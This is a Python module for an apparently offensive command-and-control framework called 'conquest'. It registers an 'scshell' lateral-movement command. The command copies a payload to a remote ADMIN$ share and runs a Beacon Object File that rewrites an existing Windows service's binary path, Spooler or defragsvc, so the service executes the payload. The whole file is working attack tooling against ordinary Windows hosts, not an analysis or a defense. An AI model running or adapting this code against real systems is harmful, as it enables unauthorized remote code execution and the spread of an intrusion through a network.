import conquest 
import os.path 

def _scshell(agentId, cmdline, args): 
    target = conquest.get_string(args, 0)
    payloadPath = conquest.get_string(args, 1)
    service = conquest.get_string(args, 2)
    name = conquest.get_string(args, 3)
    share = conquest.get_string(args, 4)

    # Format path
    path = f"\\\\{target}\\{share}\\{name if name else service + ".exe"}"

    # Read payload from disk 
    try:
        with open(payloadPath, 'rb') as f: 
            payload = f.read() 

    except FileNotFoundError:
        conquest.error(agentId, cmdline, f"File not found: {payloadPath}")
        return
    except Exception as e:
        conquest.error(agentId, cmdline, f"Error processing data: {str(e)}")
        return

    bof = conquest.modules_root() + "/lateral-movement/scshell/scshell.x64.o"
    params = conquest.bof_pack("zzzb", [
        target,         # z: Target system
        service,        # z: Target service
        path,           # z: Payload path
        payload,        # b: Payload bytes         
    ])
    
    if os.path.exists(bof):
        conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}")
    else:
        conquest.error(agentId, cmdline, f"Failed to open object file: {bof}")

cmd_scshell = (
    conquest.createCommand(name="scshell", description="Perform fileless lateral movment by modifying an existing remote service bianry path (SCShell).", example="scshell dc01 bin/monarch.smb_x64.svc.exe --service Spooler --name update.exe",
                           message="Tasked agent to perform fileless lateral movement via SCShell.", mitre=["T1021.002"])
            .addArgString("target", "Target system hostname or IP address.", True)
            .addArgString("payload", "Local path to payload to execute", True)
            .addFlagString("--service", "service", "Target service (default: defragsvc).", False, "defragsvc")
            .addFlagString("--name", "name", "Target service name (default: Name of the target service).")
            .addFlagString("--share", "share", "Share for copying payload (default: ADMIN$).", False, "ADMIN$")
            .setHandler(_scshell)            
).registerToGroup("lateral movement")